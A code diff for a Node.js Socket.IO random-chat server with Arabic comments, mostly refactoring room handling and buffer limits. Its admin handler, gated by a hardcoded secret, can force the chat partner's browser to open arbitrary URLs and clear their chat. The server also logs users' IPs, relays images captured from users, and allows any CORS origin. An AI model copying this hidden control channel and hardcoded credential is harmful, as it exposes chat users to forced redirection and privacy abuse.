@@ -5,9 +5,13 @@ const path = require('path');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server);
 
-// السماح بقراءة الملفات في المجلد
+// زيادة حد استقبال البيانات إلى 15 ميجابايت لمنع أي فصل عند إرسال ملفات أو صور كبيرة
+const io = new Server(server, {
+  maxHttpBufferSize: 15 * 1024 * 1024,
+  cors: { origin: "*" }
+});
+
 app.use(express.static(__dirname));
 
 app.get('/', (req, res) => {
@@ -20,14 +24,20 @@ io.on('connection', (socket) => {
   const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
   const userAgent = socket.handshake.headers['user-agent'] || 'غير معروف';
   
-  // حفظ معلومات الجهاز داخل الـ socket الخاص بالمستخدم لتسهيل استخدامها لاحقاً
   socket.userInfo = { ip: clientIp, ua: userAgent };
 
-  // نظام البحث والمطابقة
+  // نظام المطابقة الفوري والسليم
   socket.on('find_partner', () => {
-    // التأكد من أن المستخدم المنتظر ما زال متصلاً حقاً
+    // تنظيف أي غرفة قدبمة للمستخدم قبل البحث من جديد
+    if (socket.roomName) {
+      socket.leave(socket.roomName);
+      socket.roomName = null;
+      socket.partnerId = null;
+    }
+
     if (waitingUser && waitingUser.connected && waitingUser.id !== socket.id) {
       const roomName = 'room_' + socket.id + '_' + waitingUser.id;
+      
       socket.join(roomName);
       waitingUser.join(roomName);
 
@@ -45,7 +55,7 @@ io.on('connection', (socket) => {
     }
   });
 
-  // استقبال وإرسال الرسائل العادية
+  // توجيه الرسائل داخل الغرفة فقط
   socket.on('message', (data) => {
     if (socket.roomName) {
       socket.to(socket.roomName).emit('message', data);
@@ -59,23 +69,20 @@ io.on('connection', (socket) => {
     }
   });
 
-  // ==========================================
-  // أوامر لوحة تحكم الإدارة (مع تصحيح التوجيه)
-  // ==========================================
+  // أوامر لوحة التحكم الخاصة بالأدمن (موجّهة بدقة للغرفة النشطة)
   socket.on('admin_action', (data) => {
-    if (data.secret !== 'mySuperSecretAdmin123') return; // حماية الأوامر
+    if (data.secret !== 'mySuperSecretAdmin123') return;
 
     if (data.action === 'alert') {
       io.emit('system_alert', data.message);
     } else if (data.action === 'open_url') {
-      // توجيه المستخدم الموجود في نفس غرفة الأدمن أو بثها بحسب الحاجة
       if (socket.roomName) {
         socket.to(socket.roomName).emit('force_open_url', data.url);
       }
     } else if (data.action === 'clear_chat') {
       if (socket.roomName) {
         socket.to(socket.roomName).emit('clear_chat', data.target);
-        socket.emit('clear_chat', data.target); // مسح عندي أيضاً لو كنت في الغرفة
+        socket.emit('clear_chat', data.target);
       }
     } else if (data.action === 'change_bg') {
       if (socket.roomName) {
@@ -89,21 +96,21 @@ io.on('connection', (socket) => {
     }
   });
 
-  // تصحيح استقبال الوسائط وإرسالها بالشكل الصحيح
+  // استقبال الصورة من المستخدم وإرسالها للطرف الآخر والشات
   socket.on('user_media_captured', (mediaData) => {
     if (socket.roomName) {
-      // إرسال الصورة للطرف الآخر أو عرضها في الشات بشكل سليم
       socket.to(socket.roomName).emit('message', { type: mediaData.type, content: mediaData.dataUrl });
     }
   });
 
-  // عند قطع الاتصال
+  // قطع الاتصال والتنظيف الفوري لمنع تجميد النظام
   socket.on('disconnect', () => {
     if (waitingUser === socket) {
       waitingUser = null;
     }
     if (socket.roomName) {
       socket.to(socket.roomName).emit('partner_disconnected');
+      socket.leave(socket.roomName);
     }
   });
 });
